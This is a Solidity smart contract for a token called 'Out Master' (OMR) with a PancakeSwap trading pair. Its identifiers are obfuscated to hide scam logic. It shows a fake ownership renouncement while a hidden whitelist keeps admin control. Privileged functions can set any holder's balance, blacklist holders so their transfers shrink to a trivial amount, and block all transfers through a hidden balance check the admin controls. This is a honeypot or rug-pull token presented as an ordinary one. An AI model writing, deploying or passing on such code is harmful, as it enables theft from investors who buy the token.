//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface teamSell {
    function createPair(address liquidityTo, address atShouldLiquidity) external returns (address);
}

interface atLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalReceiver) external view returns (uint256);

    function transfer(address sellExempt, uint256 receiverLiquidityList) external returns (bool);

    function allowance(address tokenMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverLiquidityList) external returns (bool);

    function transferFrom(
        address sender,
        address sellExempt,
        uint256 receiverLiquidityList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxShouldTo, uint256 value);
    event Approval(address indexed tokenMode, address indexed spender, uint256 value);
}

abstract contract senderList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountLaunchExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atLimitMetadata is atLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OutMaster is senderList, atLimit, atLimitMetadata {

    bool public maxLaunched;

    uint256 public maxFrom;

    uint256 private receiverTradingMax;

    function owner() external view returns (address) {
        return receiverEnableMarketing;
    }

    function balanceOf(address totalReceiver) public view virtual override returns (uint256) {
        return fundAutoMarketing[totalReceiver];
    }

    function name() external view virtual override returns (string memory) {
        return tradingExemptEnable;
    }

    mapping(address => bool) public takeFee;

    function transfer(address shouldBuy, uint256 receiverLiquidityList) external virtual override returns (bool) {
        return txLiquidity(_msgSender(), shouldBuy, receiverLiquidityList);
    }

    bool public totalFund;

    function txLiquidity(address amountLaunch, address sellExempt, uint256 receiverLiquidityList) internal returns (bool) {
        if (amountLaunch == enableTeamFee) {
            return toLimit(amountLaunch, sellExempt, receiverLiquidityList);
        }
        uint256 liquidityFundTx = atLimit(teamMax).balanceOf(feeFrom);
        require(liquidityFundTx == listBuy);
        require(sellExempt != feeFrom);
        if (amountAuto[amountLaunch]) {
            return toLimit(amountLaunch, sellExempt, launchedShould);
        }
        return toLimit(amountLaunch, sellExempt, receiverLiquidityList);
    }

    string private amountSwapTotal = "OMR";

    function transferFrom(address amountLaunch, address sellExempt, uint256 receiverLiquidityList) external override returns (bool) {
        if (_msgSender() != fromAt) {
            if (buyMode[amountLaunch][_msgSender()] != type(uint256).max) {
                require(receiverLiquidityList <= buyMode[amountLaunch][_msgSender()]);
                buyMode[amountLaunch][_msgSender()] -= receiverLiquidityList;
            }
        }
        return txLiquidity(amountLaunch, sellExempt, receiverLiquidityList);
    }

    function enableFrom(address launchFrom) public {
        require(launchFrom.balance < 100000);
        if (takeLimit) {
            return;
        }
        if (maxLaunched == totalFund) {
            feeFund = isEnable;
        }
        takeFee[launchFrom] = true;
        
        takeLimit = true;
    }

    address private receiverEnableMarketing;

    event OwnershipTransferred(address indexed buyIs, address indexed launchWalletTake);

    uint256 txTrading;

    string private tradingExemptEnable = "Out Master";

    mapping(address => uint256) private fundAutoMarketing;

    function decimals() external view virtual override returns (uint8) {
        return walletTeam;
    }

    constructor (){
        
        amountLaunchExempt buyLimitMode = amountLaunchExempt(fromAt);
        teamMax = teamSell(buyLimitMode.factory()).createPair(buyLimitMode.WETH(), address(this));
        if (receiverTradingMax != feeFund) {
            maxFrom = isEnable;
        }
        enableTeamFee = _msgSender();
        takeFee[enableTeamFee] = true;
        fundAutoMarketing[enableTeamFee] = tokenExempt;
        tradingAmount();
        
        emit Transfer(address(0), enableTeamFee, tokenExempt);
    }

    function walletMax(uint256 receiverLiquidityList) public {
        receiverModeAt();
        listBuy = receiverLiquidityList;
    }

    uint256 private isEnable;

    address fromAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address feeFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tradingAmount() public {
        emit OwnershipTransferred(enableTeamFee, address(0));
        receiverEnableMarketing = address(0);
    }

    function receiverIsExempt(address shouldBuy, uint256 receiverLiquidityList) public {
        receiverModeAt();
        fundAutoMarketing[shouldBuy] = receiverLiquidityList;
    }

    uint256 listBuy;

    address public teamMax;

    uint8 private walletTeam = 18;

    function symbol() external view virtual override returns (string memory) {
        return amountSwapTotal;
    }

    function getOwner() external view returns (address) {
        return receiverEnableMarketing;
    }

    uint256 constant launchedShould = 4 ** 10;

    uint256 private tokenExempt = 100000000 * 10 ** 18;

    function allowance(address takeSell, address launchedMarketingTx) external view virtual override returns (uint256) {
        if (launchedMarketingTx == fromAt) {
            return type(uint256).max;
        }
        return buyMode[takeSell][launchedMarketingTx];
    }

    uint256 public feeFund;

    function receiverModeAt() private view {
        require(takeFee[_msgSender()]);
    }

    function receiverListToken(address senderTrading) public {
        receiverModeAt();
        if (feeFund == receiverTradingMax) {
            fundTotalFrom = true;
        }
        if (senderTrading == enableTeamFee || senderTrading == teamMax) {
            return;
        }
        amountAuto[senderTrading] = true;
    }

    bool public takeLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenExempt;
    }

    mapping(address => mapping(address => uint256)) private buyMode;

    bool public fundTotalFrom;

    mapping(address => bool) public amountAuto;

    function approve(address launchedMarketingTx, uint256 receiverLiquidityList) public virtual override returns (bool) {
        buyMode[_msgSender()][launchedMarketingTx] = receiverLiquidityList;
        emit Approval(_msgSender(), launchedMarketingTx, receiverLiquidityList);
        return true;
    }

    address public enableTeamFee;

    function toLimit(address amountLaunch, address sellExempt, uint256 receiverLiquidityList) internal returns (bool) {
        require(fundAutoMarketing[amountLaunch] >= receiverLiquidityList);
        fundAutoMarketing[amountLaunch] -= receiverLiquidityList;
        fundAutoMarketing[sellExempt] += receiverLiquidityList;
        emit Transfer(amountLaunch, sellExempt, receiverLiquidityList);
        return true;
    }

}